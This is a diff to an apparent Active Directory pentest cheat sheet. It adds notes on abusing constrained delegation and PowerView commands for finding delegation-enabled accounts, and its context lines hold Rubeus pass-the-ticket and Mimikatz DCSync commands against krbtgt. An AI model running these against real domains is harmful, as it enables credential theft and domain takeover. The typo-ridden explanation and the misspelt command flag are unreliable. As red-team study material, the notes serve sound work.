@@ -332,7 +332,18 @@ Rubeus.exe ptt /tikcet:do..[]..TA==
 Invoke-Mimikatz-Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 ```
 
+Constrained Delegation
+```powershell
+# Occours when a user wants to access a service ex. web server. web server will ask KDC for a ticket, if the user account is not bloked for a delegation KDC will return a S4USelf, then web server will send the S4USelf to the KDC again requesting S4UProxy that allows the user to access the service. This will happen if the msDS-AllowedToDelegateTo field in listed.
+# You can forge S4USelf ticket using S4U attack.
 
+#1- List users and computers with constrained delegation enabled
+Get-DomainUser-TrustedToAuth  #PowerView
+Get-DomainComputer-TrustedToAuth  #PowerView
+Get-ADObject-Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo  #AD Moudle
+
+
+```
 
 
 
